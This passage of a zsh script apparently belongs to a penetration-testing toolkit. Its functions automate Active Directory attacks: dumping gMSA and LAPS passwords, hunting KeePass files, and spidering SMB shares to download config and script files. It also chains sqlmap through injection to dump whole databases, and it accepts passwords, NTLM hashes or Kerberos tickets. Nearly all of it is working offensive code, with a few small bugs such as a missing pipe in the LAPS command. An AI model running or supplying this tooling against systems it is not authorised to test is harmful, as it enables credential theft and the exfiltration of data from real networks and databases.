   \___| _| _| \_,_| _|_|_|\033[1;33m \__/  ____/ ___| _|_\ \033[0m
'    
    if [ $# -eq 0 ]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: \033[0m $0 -t target -u user [-p password] [-H hash] [-k]"
        return 1
    fi

    # Set a trap to make each step skippable
    trap "echo ''" INT  
    
    get_auth $@
    if [[ $? -eq 2 ]]; then
        echo "Usage: $0 -t target -u user [-p password] [-H hash] [-k]"
        return 1
    fi        
    #debug
    #echo "nxc = $nxc_auth"
    #echo "imp = $imp_auth"
    #end debug
                                                   
    echo -e "\033[1;35m[!] Enumerating $user's groups \033[0m"
    echo -e "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" -M groupmembership -o USER="$user" \033[0m"
    nxc ldap "${nxc_auth[@]}" -M groupmembership -o USER="$user" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5-
    
    echo "\033[1;35m[!] Trying to dump gMSA passwords with NetExec \033[0m"
    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" --gmsa \033[0m"
    nxc ldap "${nxc_auth[@]}" --gmsa 2>/dev/null | grep -aoE "Account:.*" --color=never
    
    echo "\033[1;35m[!] Trying to dump LAPS passwords with NetExec \033[0m"
    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" -M laps / --laps --dpapi \033[0m"
    nxc ldap "${nxc_auth[@]}" -M laps 2>/dev/null  tail -n +4 | tr -s " " | cut -d " " -f 6-
    nxc smb "${nxc_auth[@]}" --laps --dpapi 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 6-
    
    
    echo "\033[1;35m[!] Trying to find KeePass files with NetExec \033[0m"
    echo "\033[0;34m[>] nxc smb "${nxc_auth[@]}" -M keepass_discover \033[0m"
    nxc smb "${nxc_auth[@]}" -M keepass_discover 2>/dev/null | grep -aoE "Found .*" --color=never
    
    trap - INT
    echo "\033[1;31m[*] Done. \033[0m"
}
    
# ENUMSHARES
# Follows the same idea of enumdomain, really. It runs a bunch of NetExec and Impacket scripts to enumerate user readable shares.
#------------------------------------------------------------------------------------
# #Usage: enumshares [-t target] -u user [-p password] [-H hash] [-k]
enumshares() {
    echo '   
                         \033[1;33m   __|  |  |    \    _ \  __|   __| \033[0m
   -_)    \   |  |   ` \ \033[1;33m \__ \  __ |   _ \     /  _|  \__ \ \033[0m
 \___| _| _| \_,_| _|_|_|\033[1;33m ____/ _| _| _/  _\ _|_\ ___| ____/ \033[0m
'    
       
    if [ $# -eq 0 ]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: \033[0m $0 [-t target] -u user [-p password] [-H hash] [-k]"
        return 1
    fi

    # Set a trap to clean up temporary files on exit
    #trap "rm -f *.tmp" EXIT INT 
    
    if [[ $1 == '-t' ]]; then
        echo "$2" > hostnames.tmp
        shift 2
    else
        cp hosts.txt hostnames.tmp
    fi       

                                                
    while read target; do
        echo "\033[1;35m[!] Enumerating $2's shares on $target \033[0m"
        echo "\033[0;34m[>] nxc smb $target $@ --shares \033[0m"
        nxc smb $target $@ --shares | grep -E "READ|WRITE" | tr -s " " | cut -d " " -f 5- | tee ${target}_${user}_shares.tmp
        cat ${target}_${user}_shares.tmp | awk -F 'READ' '{print $1}' > ${target}_${user}_sharenames.tmp
        while read share; do
            echo "\033[1;36m[?] Spider "$share" share for interesting files? [y/N]\033[0m"
            read -s -q confirm
            if [[ $confirm =~ ^[Yy]$ ]]; then 
                echo "\033[1;35m[*] Searching $share for .txt/.xml/.ini/.config/.ps1 files \033[0m"
                echo "\033[0;34m[>] nxc smb $target $@ --spider $share --regex '.txt|.xml|.config|.cnf|.conf|.ini|.ps1'  \033[0m"
                nxc smb $target $@ --spider "$share" --regex ".txt|.xml|.config|.cnf|.conf|.ini|.ps1" | grep -v "\[.\]" | tr -s " " | cut -d " " -f 5- | cut -d '[' -f 1 | sed 's/[[:space:]]*$//' | tee ${share}_files.tmp
                
                echo "\033[1;36m[?] Download files? [y/N]\033[0m"
                read -s -q confirm
                if [[ $confirm =~ ^[Yy]$ ]]; then 
                    dir_path=$(echo ${target}${2}${share} | tr -cd '[:alnum:]')
                    echo "\033[1;35m[*] Saving files to ./$dir_path \033[0m"
                    mkdir $dir_path > /dev/null 2>&1
                    while read files; do
                        share_path=$(echo $files | cut -d '/' -f -4)
                        file_path=$(echo $files | cut -d '/' -f 5- | sed 's/\//\\/g')
                        file_name=$(echo ${file_path##*\\})
                        echo "\033[0;34m[>] smbclient $share_path -U "$domain\\$2%$4" -c "get $file_path ./$dir_path/$file_name"  \033[0m"
                        smbclient $share_path -U "$domain\\$2%$4" -c "get $file_path ./$dir_path/$file_name" > /dev/null 2>&1
                    done < ${share}_files.tmp
                fi
                
            fi
        done < ${target}_${user}_sharenames.tmp
    done < hostnames.tmp
    rm *.tmp
    
    trap - INT  
    echo "\033[1;31m[*] Done. \033[0m"
}    



#!/bin/zsh

# enumsql
# Just a bunch of sqlmap in a row for enumeration and db dumping.
#------------------------------------------------------------------------------------
# Usage: enumsql target [options]
enumsql() {
    echo '
                         \033[1;33m    __|   _ \   |    \033[0m
   -_)    \   |  |   ` \ \033[1;33m  \__ \  (   |  |    \033[0m
 \___| _| _| \_,_| _|_|_|\033[1;33m  ____/ \__\_\ ____| \033[0m
 '

    if [[ $# -eq 0 ]]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: target [options]"
        return 1
    fi

    # Cria a pasta enumsql se não existir
    local TMP_DIR="enumsql"
    mkdir -p "$TMP_DIR"

    local target_id
    target_id=$(echo -n "$1" | sha1sum | awk '{print $1}')
    local TMP_PREFIX="${TMP_DIR}/enumsql_${target_id}"

    trap "echo ''" INT

    echo -e "\033[1;37m[\033[1;35m+\033[1;37m] Starting DBMS enumeration... \033[0m"

    sqlmap "$@" --batch | grep "Type:" > "${TMP_PREFIX}_sqlmap.tmp"
    if [[ $(grep -c "time-based" "${TMP_PREFIX}_sqlmap.tmp") -eq 1 ]]; then
        echo "\033[1;31m[*] Time-based injection is a possibility -- this might take a while. \033[0m"
    fi

    echo -e "\033[1;35m[!] Fetching database banner \033[0m"
    echo "\033[0;34m[>] sqlmap $@ --banner --batch  \033[0m"
    sqlmap "$@" --banner --batch 2>/dev/null | grep -E --color=never "technology:|DBMS:|banner:|system:" | grep -v '^$'
    echo -e "\033[1;35m[!] Fetching current user \033[0m"
    echo "\033[0;34m[>] sqlmap $@ --current-user --batch \033[0m"
    sqlmap "$@" --current-user --batch 2>/dev/null | grep -oP --color=never "(?<=current user: ').*(?=')" | grep -v '^$'
    echo -e "\033[1;35m[!] Checking if user is database admin \033[0m"
    echo "\033[0;34m[>] sqlmap $@ --is-dba --batch \033[0m"
    sqlmap "$@" --is-dba --batch 2>/dev/null | grep -oP --color=never "(?<=DBA: ).*" | grep -v '^$' | highlight red "True"
    echo -e "\033[1;35m[!] Fetching user privileges \033[0m"
    echo "\033[0;34m[>] sqlmap $@ --privileges --batch \033[0m"
    sqlmap "$@" --privileges --batch 2>/dev/null | grep -oP --color=never "(?<=privilege: ').*(?=')" | grep -v '^$'

    echo ""
    trap - INT
    echo -e "\033[1;37m[\033[1;35m+\033[1;37m] Starting data enumeration... \033[0m"
    echo -e "\033[1;35m[!] Fetching all databases \033[0m"
    echo -e "\033[0;34m[>] sqlmap $@ --dbs --batch \033[0m"
    sqlmap "$@" --dbs --batch 2>/dev/null | \
        grep -vE "^\s*$|starting|ending|\[INFO\]|\[WARNING\]|\[CRITICAL\]" | \
        sed 's/^\[\*\] //' | grep -E '^[a-zA-Z0-9_]+$' | tee "${TMP_PREFIX}_dbs.txt"

    if [[ ! -s "${TMP_PREFIX}_db.txt" ]]; then
        echo -e "\033[1;35m[!] Fetching current database \033[0m"
        echo -e "\033[0;34m[>] sqlmap $@ --current-db --batch \033[0m"
        sqlmap "$@" --current-db --batch 2>/dev/null | \
            grep -oP --color=never "(?<=current database: ').*(?=')" | grep -v '^$' | tee "${TMP_PREFIX}_db.txt"
    else
        echo -e "\033[1;35m[!] Database already known. Skipping. \033[0m"
        cat "${TMP_PREFIX}_db.txt"
    fi

    local db
    db=$(cat "${TMP_PREFIX}_db.txt" | head -n1)
    if [[ -n "$db" && ! -s "${TMP_PREFIX}_tables.txt" ]]; then
        echo -e "\033[1;35m[!] Fetching tables \033[0m"
        echo -e "\033[0;34m[>] sqlmap $@ -D $db --tables --batch \033[0m"
        sqlmap "$@" -D "$db" --tables --batch 2>/dev/null | grep -oP --color=never "(?<=\| ).*(?= \|)" | tail -n +2 | sed 's/[[:space:]]*$//' | tee "${TMP_PREFIX}_tables.txt"
    elif [[ -s "${TMP_PREFIX}_tables.txt" ]]; then
        echo -e "\033[1;35m[!] Tables already known. Skipping. \033[0m"
        cat "${TMP_PREFIX}_tables.txt"
    else
        echo -e "\033[1;31m[*] Database not found. Cannot fetch tables. \033[0m"
        trap - INT
        return 1
    fi

    echo -e "\033[1;36m[?] Enter the tables you are interested in (comma-separated / default: all): \033[0m"
    stty sane

    while true; do
        read -e -t 600 selected_tables
        if [[ -z "$selected_tables" ]]; then
            echo -e "\033[1;35m[!] No input provided. Proceeding with default (all tables).\033[0m"
            cat "${TMP_PREFIX}_tables.txt" > "${TMP_PREFIX}_selected_tables.tmp"
            break
        fi

        invalid_tables=0
        echo "$selected_tables" | tr ',' '\n' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' > "${TMP_PREFIX}_selected_tables.tmp"
        while IFS= read -r table; do
            if ! grep -qxF "$table" "${TMP_PREFIX}_tables.txt"; then
                echo -e "\033[1;31m[*] Table \"$table\" not found! \033[0m"
                invalid_tables=1
            fi
        done < "${TMP_PREFIX}_selected_tables.tmp"

        if [[ $invalid_tables -eq 0 ]]; then
            break
        fi

        echo -e "\033[1;36m[?] Please re-enter valid table names: \033[0m"
    done
    echo ""

    exec 3< "${TMP_PREFIX}_selected_tables.tmp"
    while IFS= read -r table <&3; do
        echo -e "\033[1;37m[\033[1;35m+\033[1;37m] Accessing \"$table\" table... \033[0m"
        echo -e "\033[1;36m[?] Fetch schema for targeted dumping? [y/N] \033[0m"
        stty sane
        read -t 600 -s -q confirm
        if [[ $confirm =~ ^[Yy]$ ]]; then
            echo -e "\033[1;35m[!] Retrieving columns \033[0m"
            echo -e "\033[0;34m[>] sqlmap $@ -D $db -T $table --columns --batch \033[0m"
            sqlmap "$@" -D "$db" -T "$table" --columns --batch 2>/dev/null | \
                head -n 1000 | tail -n +10 | grep -vE '^\+|Column|^$' | \
                awk -F'|' '{print $2}' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | \
                grep -E '^[a-zA-Z0-9_]+$' | tee "${TMP_PREFIX}_${table}_columns.tmp"

            echo -e "\033[1;36m[?] Enter the columns you are interested in (comma-separated / default: all): \033[0m"
            while true; do
                read -e -t 600 selected_columns 
                if [[ -z "$selected_columns" ]]; then
                    echo -e "\033[1;35m[!] No input provided. Dumping all columns. \033[0m"
                    echo -e "\033[0;34m[>] sqlmap $@ -D $db -T $table --dump --batch \033[0m"
                    sqlmap "$@" -D "$db" -T "$table" --dump --batch | \
                        grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | grep -vE '^\+\-+|^$'
                    break
                fi

                invalid_columns=0
                echo "$selected_columns" | tr ',' '\n' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' > "${TMP_PREFIX}_selected_columns.tmp"
                while IFS= read -r column; do
                    if ! grep -qxF "$column" "${TMP_PREFIX}_${table}_columns.tmp"; then
                        echo -e "\033[1;31m[*] Column \"$column\" not found in table \"$table\". \033[0m"
                        invalid_columns=1
                    fi
                done < "${TMP_PREFIX}_selected_columns.tmp"

                if [[ $invalid_columns -eq 0 ]]; then
                    echo -e "\033[1;35m[!] Dumping selected columns. \033[0m"
                    echo -e "\033[0;34m[>] sqlmap $@ -D $db -T $table -C $selected_columns --dump --batch \033[0m"
                    sqlmap "$@" -D "$db" -T "$table" -C "$selected_columns" --dump --batch | \
                        grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | grep -vE '^\+\-+|^$'
                    break
                fi

                echo -e "\033[1;36m[?] Please re-enter valid column names: \033[0m"
            done

        else
            echo -e "\033[1;35m[!] Dumping entire table \033[0m"
            echo -e "\033[0;34m[>] sqlmap $@ -D $db -T $table --dump --batch \033[0m"
            sqlmap "$@" -D "$db" -T "$table" --dump --batch | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | tail -n +3
        fi
        echo ""
    done
    exec 3<&-

    rm -f "${TMP_PREFIX}"*.tmp
    trap - INT
    echo "\033[1;31m[*] Done. \033[0m"
}

#              _                   _          __  __ 
#             | |                 | |        / _|/ _|
#     _____  _| |_ _ __ __ _   ___| |_ _   _| |_| |_ 
#    / _ \ \/ / __| '__/ _` | / __| __| | | |  _|  _|
#   |  __/>  <| |_| | | (_| | \__ \ |_| |_| | | | |  
#    \___/_/\_\\__|_|  \__,_| |___/\__|\__,_|_| |_|  
#                                                    
# 
#   Don't call these functions directly!                                                   


# OUTPUT HIGHLIGHTING
function highlight() {
	declare -A fg_color_map
	fg_color_map[black]=30
	fg_color_map[red]=31
	fg_color_map[green]=32
	fg_color_map[yellow]=33
	fg_color_map[blue]=34
	fg_color_map[magenta]=35
	fg_color_map[cyan]=36
	 
	fg_c=$(echo -e "\e[1;${fg_color_map[$1]}m")
	c_rs=$'\e[0m'
	sed -uE s"/$2/$fg_c\0$c_rs/g"
}

function color() {
	declare -A fg_color_map
	fg_color_map[black]=30
	fg_color_map[red]=31
	fg_color_map[green]=32
	fg_color_map[yellow]=33
	fg_color_map[blue]=34
	fg_color_map[magenta]=35
	fg_color_map[cyan]=36
	 
	fg_c=$(echo -e "\e[0;${fg_color_map[$1]}m")
	c_rs=$'\e[0m'
	sed -uE s"/$2/$fg_c\0$c_rs/g"
}

# GET_AUTH
# Used by the other functions to parse the authentication arguments.
get_auth() {
    # Initialize variables
    local kerb=0
    local target user password hashes auth
    local domain dc_ip dc_fqdn

    # Parse arguments
    while [ $# -gt 0 ]; do
        case "$1" in
            --target|-t)
                target="$2"
                shift
                ;;
            --user|-u)
                user="$2"
                shift
                ;;
            --password|-p)
                password="$2"
                auth="password"
                shift
                ;;
            --hash|-H)
                hashes="$2"
                auth="hashes"
                shift
                ;;
            --kcache)
                auth="kerb"
                shift
                ;;
            --kerb|-k)
                kerb=1
                shift
                ;;
            --domain|-d)
                domain="$2"
                shift
                ;;
            --dc-ip)
                dc_ip="$2"
                shift
                ;;
            --dc-fqdn)
                dc_fqdn="$2"
                shift
                ;;
            *)
                echo -e "\033[1;31m[!] Wrong parameters. \033[0m"
                return 2
                ;;
        esac
        shift
    done

    # Após o parsing dos argumentos:
    if [[ "$user" == "''" ]]; then user=""; fi
    if [[ "$password" == "''" ]]; then password=""; fi

    # Validate mandatory parameters
    if [[ -z "$target" ]]; then
        echo -e "\033[1;31m[!] Target is required. Use --target or -t. \033[0m"
        return 2
    fi

    # Se não passou domínio, tenta pegar do /etc/hosts
    if [[ -z "$domain" ]]; then
        domain=$(awk 'tolower($0) ~ /dc/ {print $5; exit}' /etc/hosts)
        if [[ -z "$domain" ]]; then
            echo -e "\033[1;31m[!] Domain not found. Use --domain or -d. \033[0m"
            return 2
        fi
    fi

    # Se não passou dc_ip, tenta pegar do /etc/hosts usando o domínio (case insensitive)
    if [[ -z "$dc_ip" ]]; then
        dc_ip=$(awk -v dom="$domain" 'tolower($0) ~ tolower(dom) && tolower($0) ~ /dc/ {print $1; exit}' /etc/hosts)
        if [[ -z "$dc_ip" ]]; then
            echo -e "\033[1;31m[!] DC IP not found for domain $domain. Use --dc-ip. \033[0m"
            return 2
        fi
    fi

    # Se não passou dc_fqdn, tenta pegar do /etc/hosts usando o domínio (case insensitive)
    if [[ -z "$dc_fqdn" ]]; then
        dc_fqdn=$(awk -v dom="$domain" 'tolower($0) ~ tolower(dom) && tolower($0) ~ /dc/ {print $4; exit}' /etc/hosts)
        if [[ -z "$dc_fqdn" ]]; then
            echo -e "\033[1;31m[!] DC FQDN not found for domain $domain. Use --dc-fqdn. \033[0m"
            return 2
        fi
    fi

    # Sync date (optional, ensure `ntpdate` exists)
    if command -v ntpdate > /dev/null 2>&1; then
        ntpdate "$dc_ip" > /dev/null 2>&1
    else
        echo -e "\033[1;35m[!] ntpdate not found. Skipping time sync.\033[0m"
    fi

    # Build authentication arrays
    case "$auth" in
        password)
            nxc_auth=("$target" -u "$user" -p "$password")
            imp_auth=("$domain/$user:$password" -dc-ip "$dc_ip")
            ;;
        hashes)
            nxc_auth=("$target" -u "$user" -H "$hashes")
            imp_auth=("$domain/$user" -hashes ":$hashes" -dc-ip "$dc_ip")
            ;;
        kerb)
            nxc_auth=("$target" -u "$user" --use-kcache)
            imp_auth=("$domain/$user" -k -dc-ip "$dc_ip" -dc-host "$dc_fqdn")
            ;;
        *)
            nxc_auth=("$target" -u "" -p "")
            imp_auth=("$domain/" -dc-ip "$dc_ip")
            ;;
    esac

    # Add Kerberos options if specified
    if [[ $kerb -eq 1 ]]; then
        nxc_auth+=(-k)
        imp_auth+=(-k -dc-host "$dc_fqdn")
    fi
}

